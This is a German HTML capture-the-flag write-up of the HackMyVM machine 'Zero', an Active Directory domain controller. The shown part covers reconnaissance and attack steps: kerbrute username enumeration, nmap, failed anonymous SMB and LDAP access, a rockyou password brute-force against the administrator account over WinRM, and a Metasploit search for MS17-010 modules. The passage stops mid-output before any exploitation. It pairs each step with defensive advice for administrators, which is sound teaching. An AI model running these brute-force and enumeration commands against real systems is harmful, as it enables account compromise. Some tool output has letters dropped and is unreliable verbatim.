@@ -1,0 +1,756 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zero - HackMyVM - Bericht</title> <!-- Berichtsname angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Keine Inline-Styles für Schwierigkeitsgrad-Farbe nötig, CSS regelt das -->
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <!-- Berichtsname und Level angepasst -->
+        <h1>Zero - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <!-- Schwierigkeitsgrad ohne Inline-Style -->
+            <h2>Easy</h2>
+            <!-- Klasse .difficulty-easy steuert die Farbe (Standard: grün) -->
+            <div class="circle difficulty-easy">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools aus dem Bericht extrahiert -->
+                <div class="tool-item">kerbrute</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">ldapsearch</div>
+                <div class="tool-item">enum4linux</div>
+                <div class="tool-item">crackmapexec</div>
+                <div class="tool-item">msfconsole</div>
+                <div class="tool-item">smbmap</div>
+                <div class="tool-item">git</div>
+                <div class="tool-item">msfvenom</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis generiert -->
+                <li><a href="#reconnaissance">Reconnaissance (AD Enumeration)</a></li>
+                <li><a href="#port-scanning">Port Scanning</a></li>
+                <li><a href="#enumeration-attempts">Further Enumeration Attempts</a></li>
+                <li><a href="#vulnerability-scanning">Vulnerability Scanning (MS17-010)</a></li>
+                <li><a href="#exploitation-prep">Exploitation Preparation (MS17-010)</a></li>
+                <li><a href="#poc">Proof of Concept (MS17-010 Exploitation)</a></li>
+                <li><a href="#missing-steps">Missing Steps / Conclusion</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance (AD Enumeration)</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> Der Test beginnt mit `kerbrute`, einem Werkzeug zur Enumeration von Benutzernamen in Active Directory (AD) Umgebungen über das Kerberos-Protokoll. Es sendet Kerberos TGS (Ticket Granting Service) Anfragen für potenzielle Benutzernamen aus einer Wortliste (`xato-net-10-million-usernames-dup.txt`) an den Domain Controller (`--dc 192.168.2.111`) für die Zieldomäne (`-d zero.hmv`). Wenn der KDC (Key Distribution Center) mit einem bestimmten Fehlercode antwortet (PRINCIPAL UNKNOWN), existiert der Benutzer nicht. Eine Antwort ohne diesen Fehler (oder eine Pre-Authentication Required Meldung) deutet auf einen gültigen Benutzernamen hin.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> `kerbrute` war erfolgreich und identifizierte zwei gültige Benutzernamen: `administrator` und `Administrator` (Groß-/Kleinschreibung ist bei Benutzernamen oft relevant). Dies ist ein wichtiger erster Schritt in einer AD-Umgebung, da er gültige Ziele für weitere Angriffe (Passwort-Spraying, Brute-Force, AS-REP Roasting) liefert. Die hohe Anzahl getesteter Namen (über 600.000) in relativ kurzer Zeit (43 Sek.) zeigt die Effizienz des Tools.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwende die gefundenen Benutzernamen (`Administrator`) als Ziel für Passwort-Angriffe (z.B. Spraying mit gängigen Passwörtern, Brute-Force falls erlaubt). Prüfe, ob für diese Konten Kerberos Pre-Authentication deaktiviert ist (AS-REP Roasting mit Tools wie Impacket's `GetNPUsers.py`).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Implementieren Sie starke Passwortrichtlinien und Account-Lockout-Mechanismen, um Brute-Force- und Spraying-Angriffe zu erschweren. Erzwingen Sie Kerberos Pre-Authentication für alle Benutzerkonten, um AS-REP Roasting zu verhindern. Überwachen Sie Kerberos-Authentifizierungsereignisse auf ungewöhnliche Aktivitäten oder eine hohe Anzahl fehlgeschlagener Anmeldungen von bestimmten Quellen. Vermeiden Sie, wenn möglich, leicht zu erratende Benutzernamen (obwohl 'Administrator' ein Standardkonto ist).
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿cyber)-[~]
+└─# <span class="command">kerbrute userenum -d zero.hmv --dc 192.168.2.111 /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt</span>
+                    </div>
+                    <pre>
+
+    __             __               __
+   / /_____  _____/ /_  _______  __/ /____
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
+
+Version: v1.0.3 (9dad6e1) - 05/29/24 - Ronnie Flathers @ropnop
+
+2024/05/29 23:17:25 >  Using KDC(s):
+2024/05/29 23:17:25 >  	192.168.2.111:88
+
+2024/05/29 23:17:25 >  [+] VALID USERNAME:	 administrator@zero.hmv
+2024/05/29 23:17:26 >  [+] VALID USERNAME:	 Administrator@zero.hmv
+2024/05/29 23:18:09 >  Done! Tested 624370 usernames (2 valid) in 43.435 seconds
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="port-scanning">
+            <h2>Port Scanning</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ein umfassender `nmap`-Scan wird gegen das Ziel `192.168.2.111` durchgeführt.
+                *   `-sS`: TCP SYN Scan (Stealth Scan).
+                *   `-sV`: Ermittelt Dienstversionen.
+                *   `-A`: Aggressiver Scan (beinhaltet `-sV`, OS-Erkennung, Skript-Scanning `-sC`, Traceroute).
+                *   `-T5`: Sehr schnelles Timing (kann ungenau sein oder IDS auslösen).
+                *   `-p-`: Scannt alle 65535 TCP-Ports.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Scan enthüllt eine Vielzahl offener Ports, die typisch für einen Windows Active Directory Domain Controller (DC) sind:
+                *   **AD-Dienste:** 53 (DNS), 88 (Kerberos), 135 (RPC), 139 (NetBIOS), 389 (LDAP), 445 (SMB), 464 (Kerberos Passwortänderung), 636 (LDAPS - tcpwrapped), 3268 (LDAP Global Catalog), 3269 (LDAP GC über SSL - tcpwrapped).
+                *   **Andere Windows-Dienste:** 593 (RPC über HTTP), 5985 (WinRM - Windows Remote Management), 9389 (.NET Message Framing), diverse hohe RPC-Ports (49xxx).
+                *   **Systeminformationen:** Hostname `DC01`, Domäne `zero.hmv`, OS Windows Server 2016 Standard Evaluation. Wichtig: SMB-Signing ist **erforderlich** (`message_signing: required`). SMBv1 scheint aktiv zu sein (wird später bestätigt).
+                *   **Probleme:** Die `tcpwrapped`-Ports (636, 3269) deuten auf mögliche Firewall-Filterung oder Konfigurationsprobleme hin. Die OS-Erkennung ist unsicher (`test conditions non-ideal`).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Dies ist eindeutig ein Domain Controller. Konzentriere dich auf AD-Angriffe: LDAP-Enumeration (anonym oder mit gefundenen Credentials), Kerberos-Angriffe (AS-REP Roasting, Kerberoasting - benötigt Credentials), SMB-Enumeration (Shares, Benutzer - benötigt Credentials, da Signing erforderlich ist und anonyme Abfragen wahrscheinlich fehlschlagen), WinRM (Password Spraying/Bruteforce gegen `Administrator`). Prüfe auf bekannte Schwachstellen, insbesondere im SMB-Bereich (MS17-010, da SMBv1 aktiv ist).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Härten Sie den DC: Deaktivieren Sie SMBv1 (kritisch!). Stellen Sie sicher, dass alle Patches installiert sind (insbesondere MS17-010). Beschränken Sie den Zugriff auf notwendige Ports per Firewall. Überwachen Sie AD-Authentifizierungs- und Zugriffslogs. Überprüfen Sie die Konfiguration von LDAPS (Port 636) und GC über SSL (Port 3269), wenn diese benötigt werden und als `tcpwrapped` erscheinen. Implementieren Sie starke Passwörter und Lockout-Richtlinien.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.111 -p-</span>
+                    </div>
+                    <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-29 23:18 CEST
+Nmap scan report for zero.hmv (192.168.2.111)
+Host is up (0.00011s latency).
+Not shown: 65516 filtered tcp ports (no-response)
+PRT      STATE SERVICE      VERSIN
+53/tcp    open  domain?
+88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-05-30 06:19:51Z)
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: zero.hmv, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds Windows Server 2016 Standard Evaluation 14393 microsoft-ds (workgroup: ZER)
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: zero.hmv, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf       .NET Message Framing
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49670/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+49671/tcp open  msrpc        Microsoft Windows RPC
+49687/tcp open  msrpc        Microsoft Windows RPC
+49719/tcp open  msrpc        Microsoft Windows RPC
+MAC Address: 08:00:27:62:2B:F2 (racle VirtualBox virtual NIC)
+Warning: SScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|phone|specialized
+Running (JUST GUESSING): Microsoft Windows 2016|2012|2022|Phone|7 (97%)
+S CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7
+Aggressive S guesses: Microsoft Windows Server 2016 (97%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2022 (91%), Microsoft Windows Server 2012 R2 (89%), Microsoft Windows Phone 7.5 or 8.0 (88%), Microsoft Windows Embedded Standard 7 (87%)
+No exact S matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+Service Info: Host: DC01; S: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-time:
+|   date: 2024-05-30T06:22:11
+|_  start_date: 2024-05-29T20:14:24
+|_clock-skew: mean: 11h20m09s, deviation: 4h02m29s, median: 9h00m09s
+| smb-os-discovery:
+|   S: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
+|   Computer name: DC01
+|   NetBIS computer name: DC01\x00
+|   Domain name: zero.hmv
+|   Forest name: zero.hmv
+|   FQDN: DC01.zero.hmv
+|_  System time: 2024-05-29T23:22:11-07:00
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled and required
+|_nbstat: NetBIS name: DC01, NetBIS user: <unknown>, NetBIS MAC: 08:00:27:62:2b:f2 (racle VirtualBox virtual NIC)
+
+TRACERUTE
+HP RTT     ADDRESS
+1   0.11 ms zero.hmv (192.168.2.111)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 146.84 seconds
+                    </pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Derselbe Nmap-Scan wird wiederholt, aber die Ausgabe wird mit `grep open` gefiltert, um nur die offenen Ports und die zugehörigen Dienstinformationen anzuzeigen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dies liefert eine kompakte Liste der offenen Ports, wie sie bereits im vollständigen Scan identifiziert wurden. Es bestätigt die Dienste und Versionen, bietet aber keine neuen Erkenntnisse gegenüber der vollständigen Ausgabe. Die Angabe "Simple DNS Plus" für Port 53 ist spezifischer als das "?" im vorherigen Scan, aber Nmap rät hier oft nur. Es ist wahrscheinlich der Standard Microsoft DNS Server.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nützlich für eine schnelle Übersicht, aber die vollständige Ausgabe ist für die Detailanalyse unerlässlich.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Keine spezifischen Empfehlungen aus dieser gefilterten Ansicht.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.111 -p- | grep open</span>
+                    </div>
+                    <pre>
+53/tcp    open  domain       Simple DNS Plus
+88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-05-30 06:19:44Z)
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: zero.hmv, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds Windows Server 2016 Standard Evaluation 14393 microsoft-ds (workgroup: ZER)
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: zero.hmv, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+9389/tcp  open  mc-nmf       .NET Message Framing
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49670/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+49671/tcp open  msrpc        Microsoft Windows RPC
+49687/tcp open  msrpc        Microsoft Windows RPC
+49719/tcp open  msrpc        Microsoft Windows RPC
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="enumeration-attempts">
+            <h2>Further Enumeration Attempts</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Es wird versucht, den LDAP-Verzeichnisdienst mit `ldapsearch` abzufragen.
+                *   `-x`: Verwendet einfache Authentifizierung (kein SASL).
+                *   `-H ldap://192.168.2.111`: Gibt den LDAP-Server an.
+                *   `-D "cn=Administrator,dc=zero,dc=hmv"`: Gibt den "Bind Distinguished Name" an. Es wird versucht, sich als Administrator zu authentifizieren, aber **ohne Passwort**.
+                *   `-b "dc=zero,dc=hmv"`: Gibt die Basis-DN für die Suche an (das gesamte Domänenverzeichnis).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Abfrage schlägt mit einem `operations error` fehl. Die Fehlermeldung `In order to perform this operation a successful bind must be completed on the connection.` bedeutet, dass eine erfolgreiche Authentifizierung (Bind) erforderlich ist, um die angeforderte Operation (Suche im Verzeichnis) durchzuführen. Da kein Passwort für den Administrator angegeben wurde, konnte die Bindung nicht hergestellt werden. Dies zeigt nicht notwendigerweise, dass anonyme Bindungen deaktiviert sind, sondern nur, dass dieser spezifische authentifizierte Versuch ohne Passwort fehlschlug.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Versuche zuerst eine anonyme LDAP-Bindung, um grundlegende Informationen abzufragen (z.B. `ldapsearch -x -H ldap://192.168.2.111 -b "dc=zero,dc=hmv" '(objectClass=*)' namingContexts`). Wenn dies fehlschlägt, sind gültige Credentials erforderlich, um LDAP weiter zu enumerieren (z.B. Benutzer, Gruppen, Computer, Gruppenrichtlinien).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Deaktivieren Sie anonyme LDAP-Bindungen, falls nicht zwingend erforderlich. Überwachen Sie LDAP-Bindungsversuche und -Abfragen auf verdächtige Aktivitäten.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿cyber)-[~]
+└─# <span class="command">ldapsearch -x -H ldap://192.168.2.111 -D "cn=Administrator,dc=zero,dc=hmv" -b "dc=zero,dc=hmv"</span>
+                    </div>
+                    <pre>
+# extended LDIF
+#
+# LDAPv3
+# base <dc=zero,dc=hmv> with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+
+# search result
+search: 2
+result: 1 Operations error
+text: 000004DC: LdapErr: DSID-0C0909AF, comment: In order to perform this opera
+ tion a successful bind must be completed on the connection., data 0, v3839
+
+# numResponses: 1
+                    </pre> <!-- Maskierung < > -->
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> `enum4linux -a` wird erneut ausgeführt, um umfassende Informationen über SMB/NetBIOS/RPC zu sammeln. Die Option `-a` versucht, Benutzerlisten, Gruppen, Shares, Druckerinformationen, OS-Informationen und Passwortrichtlinien zu enumerieren.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Ausgabe bestätigt erneut den Hostnamen `DC01` und die Domain/Workgroup `ZER`. Wichtig sind die Fehler:
+                *   `polenum` (Passwortrichtlinien-Enumeration) schlägt mit einem unerwarteten Fehler fehl.
+                *   Der Versuch, sich über SMB (Port 139 und 445) mit einer NULL-Session zu verbinden, um Benutzer über SAMR (Security Account Manager Remote) zu enumerieren, scheitert mit `STATUS_ACCESS_DENIED`.
+                *   Die Drucker-Enumeration (`spoolss`) scheitert ebenfalls mit `NT_STATUS_ACCESS_DENIED`.
+                Dies bestätigt, dass NULL-Sessions stark eingeschränkt sind und keine anonyme Enumeration von Benutzern oder Richtlinien über diese Wege möglich ist.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Standard-Enumeration über NULL-Sessions ist blockiert. Konzentriere dich auf die Authentifizierung mit gefundenen/erratenen Credentials (z.B. über Kerberos, LDAP-Bindung, WinRM, SMB) oder auf die Ausnutzung von Schwachstellen wie MS17-010.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Die Einschränkung von NULL-Sessions ist eine gute Sicherheitspraxis. Behalten Sie diese Konfiguration bei.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿cyber)-[~]
+└─# <span class="command">enum4linux -a 192.168.2.111</span>
+                    </div>
+                    <pre>
+Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu May 30 00:00:00 2024 <!-- Zeit angepasst -->
+
+ =========================================( Target Information )=========================================
+
+Target ........... 192.168.2.111
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ===========================( Enumerating Workgroup/Domain on 192.168.2.111 )===========================
+
+ [+] Got domain/workgroup name: ZER
+
+
+ =( Nbtstat Information for 192.168.2.111 )=
+
+Looking up status of 192.168.2.111
+	DC01            <00> -         B <ACTIVE>  Workstation Service
+	ZER             <00> - <GRUP> B <ACTIVE>  Domain/Workgroup Name
+	ZER             <1c> - <GRUP> B <ACTIVE>  Domain Controllers
+	DC01            <20> -         B <ACTIVE>  File Server Service
+	ZER             <1b> -         B <ACTIVE>  Domain Master Browser
+
+
+ =============================( Session Check on 192.168.2.111 )=============================
+
+ [+] Server 192.168.2.111 allows sessions using username '', password ''
+
+
+ ========================( Getting domain SID for 192.168.2.111 )========================
+
+ [+] Domain Name: ZER
+ [+] Domain Sid: S-1-5-21-1428058843-2653557213-3178474120
+ [+] Trying to get domain SID via PolEnum
+
+ [E] Unexpected error from polenum:
+
+
+ ========================( Enumerating Users via PolEnum on 192.168.2.111 )========================
+
+ [+] Trying polenum...
+
+
+ ========================( Enumerating Users via SAMR on 192.168.2.111 )========================
+
+ [+] Attaching to 192.168.2.111 using a NULL share
+
+ [+] Trying protocol 139/SMB...
+
+	[!] Protocol failed: Cannot request session (Called Name:192.168.2.111)
+
+ [+] Trying protocol 445/SMB...
+
+	[!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
+
+
+ ========================( Getting Share Enumeration Information from 192.168.2.111 )========================
+
+ [+] Trying to enumerate shares on 192.168.2.111...
+ [+] Attempting to map shares on 192.168.2.111...
+ //192.168.2.111/ADMIN$	Mapping error: NT_STATUS_ACCESS_DENIED
+ //192.168.2.111/C$	Mapping error: NT_STATUS_ACCESS_DENIED
+ //192.168.2.111/IPC$	Mapping error: NT_STATUS_ACCESS_DENIED
+ //192.168.2.111/NETLOGON	No details, likely ACCESS_DENIED
+ //192.168.2.111/SYSVOL	No details, likely ACCESS_DENIED
+
+
+ ========================( Getting Password Policy Information from 192.168.2.111 )========================
+
+ [+] Attaching to browser domain: ZER using NULL credentials... success.
+
+ [+] Trying to get password policy via SAMR
+ [!] Couldn't get password policy (SAMR)! Error was: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
+
+ [+] Trying to get password policy via LSA
+ [+] Attaching to LSA policy...
+ [+] Getting policy failed: LSA SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
+
+
+ ========================( Enumerating Printer Information via Spoolss )========================
+
+ [+] Trying to enumerate printers
+ do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED
+
+ enum4linux complete on Thu May 30 00:00:00 2024 <!-- Zeit angepasst -->
+                    </pre> <!-- Maskierung < > -->
+                </div>
+            </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Mit `crackmapexec` wird ein Passwort-Brute-Force-Angriff gegen den WinRM-Dienst (Port 5985) gestartet. Ziel ist das Benutzerkonto `administrator` (gefunden mit Kerbrute), als Passwortliste wird `rockyou.txt` verwendet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Angriff wird gestartet, aber die angezeigte Ausgabe zeigt nur fehlgeschlagene Versuche (`[-]`). Es wird kein erfolgreicher Login für `administrator` mit einem Passwort aus `rockyou.txt` gefunden (zumindest nicht im gezeigten Ausschnitt).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ein Brute-Force-Angriff auf das `administrator`-Konto ist oft schwierig und zeitaufwändig, insbesondere bei Verwendung starker Passwörter oder Account-Lockout-Richtlinien. Wenn dies nicht schnell zum Erfolg führt, konzentriere dich auf andere Vektoren wie Schwachstellen (MS17-010) oder andere Enumerationsmethoden (Kerberos).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass das Administrator-Konto ein sehr starkes, einzigartiges Passwort hat. Implementieren Sie eine robuste Account-Lockout-Richtlinie. Überwachen Sie WinRM-Login-Versuche.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿cyber)-[~]
+ └─# <span class="command">crackmapexec winrm 192.168.2.111 -u administrator -p /usr/share/wordlists/rockyou.txt</span>
+                     </div>
+                     <pre>
+ WINRM       192.168.2.111   5985   DC01             [-] zero.hmv\administrator:555222
+ WINRM       192.168.2.111   5985   DC01             [-] zero.hmv\administrator:45612
+ WINRM       192.168.2.111   5985   DC01             [-] zero.hmv\administrator:310591
+ WINRM       192.168.2.111   5985   DC01             [-] zero.hmv\administrator:310190
+ WINRM       192.168.2.111   5985   DC01             [-] zero.hmv\administrator:301186
+ WINRM       192.168.2.111   5985   DC01             [-] zero.hmv\administrator:300987
+ WINRM       192.168.2.111   5985   DC01             [-] zero.hmv\administrator:300393
+ WINRM       192.168.2.111   5985   DC01             [-] zero.hmv\administrator:2pac4life
+ WINRM       192.168.2.111   5985   DC01             [-] zero.hmv\administrator:290890
+ WINRM       192.168.2.111   5985   DC01             [-] zero.hmv\administrator:290491
+ # ... (weitere fehlgeschlagene Versuche)
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> `smbmap` wird erneut verwendet, um anonym (`-u ""`) auf SMB-Shares zuzugreifen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Versuch schlägt wieder fehl (`STATUS_ACCESS_DENIED`), was die vorherigen Ergebnisse von `enum4linux` und `smbclient` bestätigt. Anonyme SMB-Enumeration ist nicht möglich.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Fokus auf authentifizierte Enumeration oder Schwachstellen legen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Gute Konfiguration, keine anonymen SMB-Zugriffe erlaubt.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿cyber)-[~]
+└─# <span class="command">smbmap -H 192.168.2.111 -u ""</span>
+                    </div>
+                    <pre>
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+ -----------------------------------------------------------------------------
+     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[*] Detected 1 hosts serving SMB
+[*] Established 1 SMB session(s)
+[!] Something weird happened: SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights. on line 970
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> `crackmapexec` wird ohne Benutzername/Passwort gegen den SMB-Dienst ausgeführt, um grundlegende Informationen zu sammeln (ähnlich wie beim ersten `crackmapexec smb`-Lauf im Bericht, möglicherweise eine Wiederholung oder ein erneuter Check).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Bestätigt erneut OS-Version, Hostname, Domäne, erforderliches Signing und aktiviertes SMBv1. Keine neuen Informationen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Vermeide redundante Informationsabfragen, es sei denn, es gibt einen Grund zur Annahme, dass sich etwas geändert hat.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Keine neuen Empfehlungen.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿cyber)-[~]
+ └─# <span class="command">crackmapexec smb 192.168.2.111</span>
+                     </div>
+                     <pre>
+ SMB         192.168.2.111   445    DC01             [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:DC01) (domain:zero.hmv) (signing:True) (SMBv1:True)
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="vulnerability-scanning">
+            <h2>Vulnerability Scanning (MS17-010)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> `msfconsole` wird gestartet und das Metasploit-Framework durchsucht (`search ms17`) nach Modulen, die sich auf die MS17-010-Schwachstelle (EternalBlue/EternalRomance) beziehen. Das Modul `exploit/windows/smb/ms17_010_psexec` (Index 10) wird zur Verwendung ausgewählt (`use 10`).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dies zeigt eine gezielte Vorbereitung auf die Ausnutzung der MS17-010 Schwachstelle. Die Wahl des `psexec`-Moduls deutet darauf hin, dass der Angreifer versucht, Code über eine etablierte Verbindung auszuführen, nachdem die Schwachstelle ausgenutzt wurde, was oft stabiler ist als der reine `eternalblue`-Exploit.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Konfiguriere das ausgewählte Modul (RHOSTS, Payload, LHOST, LPORT) und führe es aus.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass das System gegen MS17-010 gepatcht ist. Deaktivieren Sie SMBv1. Überwachen Sie SMB-Verkehr auf Anzeichen von Exploitation.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿cyber)-[~]
+└─# <span class="command">msfconsole -q</span>
+                    </div>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt metasploit-prompt">
+msf6 > <span class="command">search ms17</span>
+                    </div>
+                    <pre>
+Matching Modules
+================
+
+   #   Name                                                  Disclosure Date  Rank     Check  Description
+   -   ----                                                  ---------------  ----     -----  -----------
+   0   exploit/windows/smb/ms17_010_eternalblue              2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   1     \_ target: Automatic Target                         .                .        .      .
+   2     \_ target: Windows 7                                .                .        .      .
+   3     \_ target: Windows Embedded Standard 7              .                .        .      .
+   4     \_ target: Windows Server 2008 R2                   .                .        .      .
+   5     \_ target: Windows 8                                .                .        .      .
+   6     \_ target: Windows 8.1                              .                .        .      .
+   7     \_ target: Windows Server 2012                      .                .        .      .
+   8     \_ target: Windows 10 Pro                           .                .        .      .
+   9     \_ target: Windows 10 Enterprise Evaluation         .                .        .      .
